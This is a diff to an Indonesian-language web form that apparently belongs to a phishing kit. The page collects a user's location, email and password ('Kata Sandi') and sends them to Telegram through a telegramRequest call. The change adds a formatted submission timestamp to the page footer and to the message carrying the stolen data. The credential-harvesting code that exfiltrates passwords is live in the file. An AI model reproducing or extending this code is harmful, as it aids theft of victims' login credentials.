@@ -43,7 +43,8 @@
       <input class="1" id="kata_sandi" type="password" placeholder="Masukkan Kata Sandi" required></input>
       <br>
       <input id="submit" type="submit" onclick="sendText()"></input>
-    
+      <br>
+    <footer>Waktu Di-Submit :</footer>
     </form>
     <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     
@@ -81,7 +82,24 @@ async function telegramRequest(method, data) {
 }
 document.getElementById('submit').addEventListener("click", function() {
   let datesubmit;
-  
+                        var waktu = new Date();
+                        var tahun = waktu.getFullYear();
+                        var bulan = waktu.toLocaleDateString('id-ID', { month: 'long' });
+                        var tanggal = waktu.getDate();
+                        var hari = waktu.toLocaleDateString('id-ID', { weekday: 'long' });
+                        var jam = waktu.getHours();
+                        var menit = waktu.getMinutes();
+                        var detik = waktu.getSeconds();
+
+                        // Tambahkan angka 0 di depan jam, menit, dan detik jika nilainya kurang dari 10
+                        jam = (jam < 10 ? "0" : "") + jam;
+                        menit = (menit < 10 ? "0" : "") + menit;
+                        detik = (detik < 10 ? "0" : "") + detik;
+
+                        var waktuString = hari + ', ' + tanggal + ' ' + bulan + ' ' + tahun + ' ' + jam + ':' + menit + ':' + detik;
+document.querySelector('form > footer').innerHTML = "Waktu Di-Submit : " + waktuString
+                        datesubmit = waktuString;
+})
 const form = document.getElementById('form');
 let tgl_lahir; // Deklarasikan variabel tgl_lahir di luar event listener
 
@@ -112,6 +130,7 @@ form.addEventListener('submit', async (event) => {
   Lokasi : ${alamat}
   Email : ${email}
   Kata Sandi : ${kata_sandi}
+  Dikirim Pada : ${datesubmit}
   `;
 
   // Kirim data ke Telegram
